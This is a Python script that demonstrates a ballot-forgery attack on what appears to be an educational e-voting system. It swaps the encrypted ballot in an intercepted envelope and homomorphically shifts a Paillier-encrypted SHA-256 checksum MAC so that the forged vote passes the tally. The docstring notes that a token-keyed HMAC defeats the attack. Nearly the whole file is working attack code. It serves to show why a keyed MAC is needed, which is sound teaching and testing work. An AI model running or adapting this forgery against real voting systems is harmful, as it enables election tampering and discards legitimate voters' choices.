#!/usr/bin/env python3
"""Attack demonstration: replace a voter's ballot and adjust its MAC homomorphically.

The attacker only has public information: public-key.txt (every voter receives it) and an
envelope intercepted on its way to the election mailbox. The attacker does NOT know the
voter's token or the private key.

The script replaces the ballot in one envelope with a new ballot for a candidate of the
attacker's choice. It then multiplies the encrypted MAC by E(SHA-256(new) - SHA-256(old)),
which adds that difference to the hidden value inside the MAC without decrypting it.

- Against a MAC that holds a plain SHA-256 checksum, the forged envelope passes every
  check in tally-votes and the attacker's vote is counted with the victim's token.
- Against the HMAC keyed by the voter token, the attacker cannot compute the right
  difference, and tally-votes rejects the envelope.

Usage:
    ./forge-ballot.py votes.txt 1 > forged.txt      # replace envelope 1 with a vote for candidate 1
    ./forge-ballot.py votes.txt 2 3 > forged.txt    # replace envelope 3 with a vote for candidate 2
    ./tally-votes <forged.txt

For demonstration only.
"""
import base64
import hashlib
import re
import secrets
import sys
from math import gcd

PUBLIC_KEY_FILENAME = "public-key.txt"
BASE64_LINE_LENGTH = 72
SECTION = re.compile(r"(-+BEGIN:(BALLOT|MAC)-+\n)(.*?)(-+END:\2-+)", re.S)


def read_public_key():
    """Returns (n, number of candidates, number of voters) from public-key.txt."""
    with open(PUBLIC_KEY_FILENAME) as public_key:
        lines = public_key.read().splitlines()
    return int(lines[0].strip(), 16), int(lines[1]), int(lines[2])


def encrypt(n, m):
    """Paillier encryption with g = n + 1, as in libpaillier: (1 + m*n) * r^n mod n^2."""
    n_squared = n * n
    while True:
        r = secrets.randbelow(n - 1) + 1
        if gcd(r, n) == 1:
            break
    return (1 + (m % n) * n) * pow(r, n, n_squared) % n_squared


def to_bytes(value):
    """Big-endian bytes without leading zeros, like mpz_export in CryptoCommon.cpp."""
    return value.to_bytes((value.bit_length() + 7) // 8, "big")


def to_base64(value):
    encoded = base64.b64encode(to_bytes(value)).decode("ascii")
    lines = [encoded[i:i + BASE64_LINE_LENGTH] for i in range(0, len(encoded), BASE64_LINE_LENGTH)]
    return "\n".join(lines) + "\n"


def from_base64(text):
    return int.from_bytes(base64.b64decode("".join(text.split())), "big")


def sha256_int(value):
    return int.from_bytes(hashlib.sha256(to_bytes(value)).digest(), "big")


def main():
    if len(sys.argv) not in (3, 4):
        print(__doc__, file=sys.stderr)
        return 1
    votes_filename = sys.argv[1]
    candidate = int(sys.argv[2])
    envelope_number = int(sys.argv[3]) if len(sys.argv) == 4 else 1
    n, num_candidates, num_voters = read_public_key()
    if not 1 <= candidate <= num_candidates:
        print("The candidate must be between 1 and", num_candidates, file=sys.stderr)
        return 1
    with open(votes_filename) as votes_file:
        text = votes_file.read().replace("\r\n", "\n")
    sections = list(SECTION.finditer(text))
    ballots = [s for s in sections if s.group(2) == "BALLOT"]
    macs = [s for s in sections if s.group(2) == "MAC"]
    if not 1 <= envelope_number <= min(len(ballots), len(macs)):
        print("Envelope", envelope_number, "was not found in", votes_filename, file=sys.stderr)
        return 1
    old_ballot_section = ballots[envelope_number - 1]
    old_mac_section = macs[envelope_number - 1]
    old_ballot = from_base64(old_ballot_section.group(3))
    old_mac = from_base64(old_mac_section.group(3))
    # A new ballot for the attacker's candidate, encoded like cast-vote does.
    new_ballot = encrypt(n, (num_voters + 1) ** (candidate - 1))
    # Shift the hidden checksum inside the MAC from SHA-256(old) to SHA-256(new).
    difference = (sha256_int(new_ballot) - sha256_int(old_ballot)) % n
    new_mac = old_mac * encrypt(n, difference) % (n * n)
    # Write the votes file back with only this envelope changed.
    replacements = {
        old_ballot_section.start(3): (old_ballot_section.end(3), to_base64(new_ballot)),
        old_mac_section.start(3): (old_mac_section.end(3), to_base64(new_mac)),
    }
    output, position = [], 0
    for start in sorted(replacements):
        end, body = replacements[start]
        output.append(text[position:start])
        output.append(body)
        position = end
    output.append(text[position:])
    sys.stdout.write("".join(output))
    print("Envelope", envelope_number, "now holds a vote for candidate", candidate,
          "with an adjusted MAC.", file=sys.stderr)
    return 0


if __name__ == "__main__":
    sys.exit(main())
